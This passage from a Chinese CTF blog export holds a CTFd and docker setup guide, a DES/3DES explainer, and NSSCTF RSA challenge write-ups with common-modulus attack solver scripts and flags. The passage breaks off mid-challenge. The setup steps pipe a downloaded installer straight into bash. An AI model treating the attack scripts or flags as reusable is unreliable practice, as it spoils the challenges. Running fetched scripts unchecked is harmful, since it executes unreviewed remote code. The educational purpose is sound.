class="built_in">len</span>(message),<span class="number">16</span>):</span><br><span class="line">    aes_ecb = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    dec_c = aes_ecb.decrypt(enc)</span><br><span class="line">    enc = xor(message[<span class="built_in">len</span>(message)-i-<span class="number">16</span>:<span class="built_in">len</span>(message)-i],dec_c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>+enc+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd搭建</title>
    <url>/posts/40446ce/</url>
    <content><![CDATA[<ol>
<li><p>切换国内源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/apt/source.list /etc/apt/source.list.bak</span><br><span class="line">vim /etc/apt/source.list </span><br><span class="line">注释替换为</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">然后sudo apt update   sudo apt upgrade </span><br></pre></td></tr></table></figure></li>
<li><p>安装pip</p>
<p><code>sudo apt install pip</code></p>
</li>
<li><p>安装git</p>
<p><code>apt-get install git -y</code></p>
</li>
<li><p>安装curl</p>
<p><code>apt-get install curl -y</code></p>
</li>
<li><p>安装docker </p>
<p><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></p>
</li>
<li><p>安装docker-compose</p>
</li>
<li><p>docker集群设置</p>
</li>
</ol>
<p>​        <code>docker swarm init</code>  # 初始化</p>
<p>​        <code>docker node ls</code> # 查看节点ID</p>
<p>​        <code>docker node update --label-add name=linux-1  &lt;节点ID&gt;</code>  # 添加别名</p>
<p>8.拷贝已经修改过的ctfd_3.5.0 然后进入 第一层目录  sudo docker-compose build </p>
<p>​        <code>sudo docker-compose up -d</code> 启动docker</p>
<p>9.访问web端进行初始化配置</p>
<p>10.配置ctfd-whale</p>
<p><img src="/posts/40446ce/1.png"></p>
<p><img src="/posts/40446ce/2.png"></p>
<p>这里修改对应的 frp direct ip Address</p>
<hr>
<p>docker-compose 报错 TypeError: kwargs_from_env() got an unexpected keyword argument ‘ssl_version’</p>
<p>解决方案 ：  pip install docker==6.1.3</p>
<p><img src="/posts/40446ce/3.png"></p>
<p><a href="https://blog.csdn.net/dl1456074580/article/details/135209246">https://blog.csdn.net/dl1456074580/article/details/135209246</a></p>
<p>参考文章</p>
<p><a href="https://www.zhaoj.in/read-6333.html">https://www.zhaoj.in/read-6333.html</a></p>
<p><a href="https://www.anyiblog.top/2023/04/13/20230413/">https://www.anyiblog.top/2023/04/13/20230413/</a></p>
]]></content>
      <categories>
        <category>CTFd</category>
      </categories>
      <tags>
        <tag>CTFd</tag>
      </tags>
  </entry>
  <entry>
    <title>DES加密</title>
    <url>/posts/64eed679/</url>
    <content><![CDATA[<h1 id="DES算法简介"><a href="#DES算法简介" class="headerlink" title="DES算法简介"></a>DES算法简介</h1><p>DES   是一种典型的分组密码，【将固定长度的明文通过一系列复杂的操作变成同样长度密文的算法】</p>
<p>在运行一次DES算法后 只能对<strong>64位长度</strong>的数据进行加密操作，所以不适用于对大数据进行处理。</p>
<p>对称加密算法 使用相同的密码进行加密与解密。</p>
<p>明文：64位</p>
<p>密文：64位</p>
<p>密钥：64位【实际 <strong>56</strong> 位 每8位中含一位奇偶校验位 8,16,24…64】</p>
<p>使用Feistel框架，采用16轮循环加密</p>
<h1 id="DES算法原理"><a href="#DES算法原理" class="headerlink" title="DES算法原理"></a>DES算法原理</h1><h2 id="Feistel网络"><a href="#Feistel网络" class="headerlink" title="Feistel网络"></a>Feistel网络</h2><p>Feistel cipher 也叫做Luby–Rackoff分组密码 DES就使用的该方法，加密和解密操作相似，需要进行多轮的加解密操作。</p>
<p>在Feistel网络中 加密的各个步骤称为 轮 ， 整个加密过程就是进行若干轮的循环。</p>
<p><img src="/posts/64eed679/1.png"></p>
<p>一轮过程具体如下：</p>
<p>1.将输入的64bit 分成两组32bit【记作左侧、右侧】</p>
<p>2.将右侧数据直接发送到右侧输出中</p>
<p>3.将右侧数据发送给轮函数，轮函数通过子密钥和右侧数据 进行运算处理生成加密的比特序列</p>
<p>4.将处理后的数据与左侧数据进行XOR，将加密结果作为左侧输出数据</p>
<p>从上图可看出，右侧数据并没有进行加密，因此需要用不同的子密钥进行若干轮处理，并将每次处理前左右侧数据对调。【最后一轮中不再进行左右侧数据对调】</p>
<h2 id="DES加密流程"><a href="#DES加密流程" class="headerlink" title="DES加密流程"></a>DES加密流程</h2><p>DES加密流程如下图所示：</p>
<p><img src="/posts/64eed679/2.png"></p>
<p>简要概括为：</p>
<p>1.将明文进行 初始置换IP</p>
<p>2.进行16轮加密处理</p>
<p>3.进行 逆初始置换IP-1 ，输出密文</p>
<p>-—————————————————–</p>
<ul>
<li>明文处理阶段</li>
</ul>
<p>明文初始置换【64位】 置换后明文分2组【32位】</p>
<ul>
<li><p>子密钥生成阶段</p>
</li>
<li><p>加密阶段</p>
</li>
<li><p>密文逆置换阶段</p>
</li>
</ul>
<p>将上述操作的密文进行逆置换得到最终密文</p>
<p>-—————————————————-</p>
<p>具体流程如下：</p>
<h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h3><p>IP置换 将输入的64位数据块重新组合，并分为L0 R0两组，每部分32位【实际分组中 前32位数据为L组 后32位数据位R组】</p>
<p>初始置换表如下：</p>
<p><img src="/posts/64eed679/3.png"></p>
<p>首先将64位明文数据 按从左到右，从上到下排列为8x8矩阵。</p>
<p>0行0列出58 表示将第58位上的数值置换到0,0处的值  总共需要置换64次得到最终结果。</p>
<h3 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h3><p>DES中</p>
<p><img src="/posts/64eed679/4.png"></p>
<p>可简单概括为如下步骤：</p>
<p>1.将32位 R组进行拓展置换，生成48位数据;</p>
<p>2.将置换生成的48位数据与48位的子密钥进行异或，得到48位运算结果;</p>
<p>3.将48位运算结果分成8组，每组6位，进行s盒置换得到4位的数据;</p>
<p>4.将8个4bit的数据合并得到32位数据;</p>
<p>5.将32位数据进行P置换 最终得到32位处理结果。</p>
<h4 id="拓展置换"><a href="#拓展置换" class="headerlink" title="拓展置换"></a>拓展置换</h4><p>通过拓展置换，将输入数据长度从32位【4x8】变为48位【6x8】，在两边分别加一列拓展的重复数据。</p>
<p><img src="/posts/64eed679/5.png"></p>
<h4 id="S盒置换"><a href="#S盒置换" class="headerlink" title="S盒置换"></a>S盒置换</h4><p>在s盒置换之前需要将异或运算的结果进行分组【48位】，从前往后分成8组，每组6bit数据，每组对应一个S盒表。【s1~s8盒表内容如下】</p>
<p><img src="/posts/64eed679/6.png"></p>
<p><img src="/posts/64eed679/7.png"></p>
<p>都是由 4x16矩阵构成，所以可以以4bit来表示。</p>
<p>在拓展置换后的数中，第一个bit称为MSB，最后一bit称为为LSB，第一个bit权重最高，中间4bit为原始数据，最后一个bit权重最低。</p>
<p>MSB位和LSB位构成的二进制表示s盒中行号，中间原始数据的二进制表示列号</p>
<p><img src="/posts/64eed679/8.png"></p>
<h4 id="P置换"><a href="#P置换" class="headerlink" title="P置换"></a>P置换</h4><p>P置换和初始置换大似相同</p>
<p><img src="/posts/64eed679/9.png"></p>
<p>最终输出 32位数据</p>
<h3 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h3><p>F函数输出的32位数据 与 L[i]组数据进行按位异或运算，得到32位运算结果，最后把结果赋值给R[i+1]。R[i]组32位数据会直接赋值给L[i+1]【不做任何改变】</p>
<p>这样就完成了一轮DES算法。经过16轮处理后得到最后一组数据L[16]、R[16]。</p>
<p>R[i+1] = L[i] ^ F(R[i],K[i])</p>
<p>L[i+1] = R[i]</p>
<p>R[16]作为前32位数据，L[16]作为后32位数据 合并得到64位数据，然后进行逆初始值置值处理【和初始置换相似】 最终得到加密的密文。</p>
<p><img src="/posts/64eed679/10.png"></p>
<h2 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h2><p>输入密钥64位【实际56位，根据置换表得到密钥 28位x2】</p>
<p><img src="/posts/64eed679/11.png"></p>
<h3 id="PC-1置换"><a href="#PC-1置换" class="headerlink" title="PC-1置换"></a>PC-1置换</h3><p><img src="/posts/64eed679/12.png"></p>
<p>PC-1【PERMUTED CHOICE 1 】置换表是一个 7x8矩阵，</p>
<p>前28位分为一组记作C组，后28位为另一组记作 D组。</p>
<h3 id="左移处理"><a href="#左移处理" class="headerlink" title="左移处理"></a>左移处理</h3><p>当i=1,2,9,16轮时，C、D两组向左移一位，其他轮C、D两组向左移2位。</p>
<p><img src="/posts/64eed679/13.png"></p>
<h3 id="PC-2置换"><a href="#PC-2置换" class="headerlink" title="PC-2置换"></a>PC-2置换</h3><p>在进行PC-2置换前，将左移后的C D两组数据【28bit】合并，形成56bit的数据块，PC-2 置换表是一个 6x8矩阵，经过PC-2置换后会变成一个48bit的子密钥。</p>
<p><img src="/posts/64eed679/14.png"></p>
<h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>参考 <a href="https://blog.csdn.net/qq_41137136/article/details/86416849">https://blog.csdn.net/qq_41137136/article/details/86416849</a></p>
<p>DES加密的一种模式，基于DES的对称加密算法，使用三条不同的64【56】位密钥对数据进行三次加密【56x3=168】。</p>
<p>设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">密钥</a>，P代表明文，C代表密表，这样，</p>
<p>　　3DES加密过程为：C=E(K1,D(K2,E(K1,P))，</p>
<p>　　3DES解密过程为：P=D(K1,E(K2,D(K1,C))</p>
<p>K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位。</p>
<p><img src="/posts/64eed679/15.png"></p>
<p><img src="/posts/64eed679/16.png"></p>
<p>如果三个密钥都相同，则3DES等价于DES;</p>
<p>如果有两个不同的密钥，则这种3DES称为DES-EDE2;</p>
<p>如果有三个不同的密钥，则这种3DES称为DES-EDE3.【EDE表示加密-解密-加密的过程】</p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.kanxue.com/thread-269299.htm">https://bbs.kanxue.com/thread-269299.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-253558.htm">https://bbs.kanxue.com/thread-253558.htm</a></p>
<p><a href="https://www.xuenixiang.com/thread-2477-1-1.html">https://www.xuenixiang.com/thread-2477-1-1.html</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Crypto 01</title>
    <url>/posts/bb5a57d9/</url>
    <content><![CDATA[<p>记录下近期在NSSCTF Crypto的刷题记录  …. 密码学新手菜鸡简单记录。数学基础不是很好 还在慢慢补……</p>
<h2 id="SWPUCTF-2021-新生赛-crypto1-共模攻击"><a href="#SWPUCTF-2021-新生赛-crypto1-共模攻击" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto1 共模攻击"></a>[SWPUCTF 2021 新生赛]crypto1 共模攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;****************************&#x27;</span></span><br><span class="line">flag = &#123;<span class="string">&quot;asfajgfbiagbwe&quot;</span>&#125;</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line"><span class="comment">#flag2= 130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line"><span class="comment">#n= 609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>1.e1*e2=3087 尝试分解e1 e2</p>
<p>2.flag1 flag2【c1 c2】 公用同一个模进行加密【共模攻击】</p>
<p>利用前提： RSA在生成密钥过程中使用相同的模数 n</p>
<p>已知 n c1 c2 e1 e2 求m 【在不知d1 d2情况下得到m】</p>
<p><img src="/posts/bb5a57d9/1.png"></p>
<p>WP:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知c1 c2 n  分解e1e2得到e1\e2  使用共模攻击</span></span><br><span class="line">c1= <span class="number">463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line">c2= <span class="number">130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line">n= <span class="number">609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line"><span class="comment"># factordb 可以将e1e2分解成  3^2*7^3</span></span><br><span class="line"><span class="comment"># 相比与爆破 2~3087 效率会高很多</span></span><br><span class="line">fac = [<span class="number">3</span>,<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>,<span class="number">3</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>*<span class="number">7</span>]</span><br><span class="line"><span class="comment"># print(len(fac))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> fac:</span><br><span class="line">    <span class="keyword">if</span> e1e2 % e1 == <span class="number">0</span>:</span><br><span class="line">        e2 = e1e2 // e1</span><br><span class="line">        <span class="comment"># 欧几里得拓展  e1*s1+e2*s2=1</span></span><br><span class="line">        s0,s1,s2 = gmpy2.gcdext(e1,e2)</span><br><span class="line">        <span class="comment"># print(s0,s1,s2)</span></span><br><span class="line">        <span class="comment"># # 共模攻击</span></span><br><span class="line">        m_s0 = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">        m = long_to_bytes(gmpy2.iroot(m_s0,s0)[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;d64dba66-b608-4255-b888-0b0f25c2f90e&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-crypto2-共模攻击"><a href="#SWPUCTF-2021-新生赛-crypto2-共模攻击" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto2 共模攻击"></a>[SWPUCTF 2021 新生赛]crypto2 共模攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WP：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>): <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">c1= <span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line">c2= <span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line">n= <span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line">m = rsa_gong_N_def(e1,e2,c1,c2,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-crypto3"><a href="#SWPUCTF-2021-新生赛-crypto3" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto3 [-]"></a>[SWPUCTF 2021 新生赛]crypto3 [-]</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;******************&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,p,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,q,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857</span></span><br><span class="line"><span class="comment">#flag2= 95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954</span></span><br><span class="line"><span class="comment">#n= 140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>共模n  已知c1 c2 但是e1 e2未知</p>
<h2 id="SWPUCTF-2021-新生赛-crypto4-素数分解"><a href="#SWPUCTF-2021-新生赛-crypto4-素数分解" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto4 素数分解"></a>[SWPUCTF 2021 新生赛]crypto4 素数分解</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;**********&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">flag= <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n= <span 